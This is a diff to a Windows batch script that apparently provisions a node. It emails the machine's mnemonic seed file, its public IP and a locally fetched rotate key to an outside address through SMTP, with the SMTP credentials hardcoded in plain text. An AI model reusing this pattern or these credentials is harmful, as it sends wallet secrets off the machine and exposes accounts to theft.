@@ -1,7 +1,7 @@
 @echo off
 :SendEmail
-cd dll
-ping -n 6 127.0.0.1 > nul
+ping -n 1 127.0.0.1 > nul
+set curlIn=""
 set /p mnemoricSeedMail=< mnemoricSeed.txt
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
@@ -11,13 +11,14 @@ FOR /F "tokens=* USEBACKQ" %%g IN (`curl.exe --request POST "http://localhost:83
 	(for /f "tokens=2,* delims=:" %%a in (curlOutTR.txt) do echo %%a) > curl.txt
 )
 set /p curlIn=< curl.txt
-set curlIn=%curlIn:~1,-1% 
+set curlIn=%curlIn:~1,-1%
 del curlOut.txt
 del curlOutTR.txt
 del curl.txt
-IF "%curlIn%"=="" (
-	goto SendEmail
-) ELSE (
-	cmail.exe -host:server35216:Ae54Tfz3CYc6y9D8@smtp.socketlabs.com:587 -starttls -to:teranyina@easyinnova.com -from:teranyina@easyinnova.com "-subject:New new node from %PublicIP%" "-body:Mnemoric seed: --%mnemoricSeedMail%-- Rotate key: --%curlIn%--."
+
+if "%curlIn%" == "" (
+    goto SendEmail
+) else (
+    cmail.exe -host:server35216:Ae54Tfz3CYc6y9D8@smtp.socketlabs.com:587 -starttls -to:teranyina@easyinnova.com -from:teranyina@easyinnova.com "-subject:New new node from %PublicIP%" "-body:Mnemoric seed: --%mnemoricSeedMail%-- Rotate key: --%curlIn%--."
 )
 EXIT 0
